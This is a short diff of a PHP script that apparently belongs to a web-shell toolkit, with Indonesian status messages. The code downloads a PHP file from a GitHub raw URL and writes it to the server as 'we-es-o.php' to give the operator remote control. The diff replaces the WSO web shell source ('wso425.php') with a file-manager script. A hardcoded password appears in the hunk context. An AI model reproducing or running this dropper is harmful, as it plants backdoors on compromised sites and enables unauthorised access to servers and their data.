@@ -424,7 +424,7 @@ password: SanakK1T0#G410 </code></pre>
 	if(file_exists('we-es-o.php')) {
 		echo "<gr><a style='color:white;text-decoration:none;' href=$full/we-es-o.php target='_blank'>Click Here</a></gr></center>";
 	} else {
-		if(wso("https://raw.githubusercontent.com/BOTKNTL/kontol/master/wso425.php","we-es-o.php")) {
+		if(wso("https://raw.githubusercontent.com/prasathmani/tinyfilemanager/master/tinyfilemanager.php","we-es-o.php")) {
 			echo "<gr><a style='color:white;text-decoration:none;' href=$full/we-es-o.php target='_blank'>Click Here</a></gr></center>";
 		} else {
 			echo "<rd>WEY GAGAL BUEK WSO SHELL</rd>";}
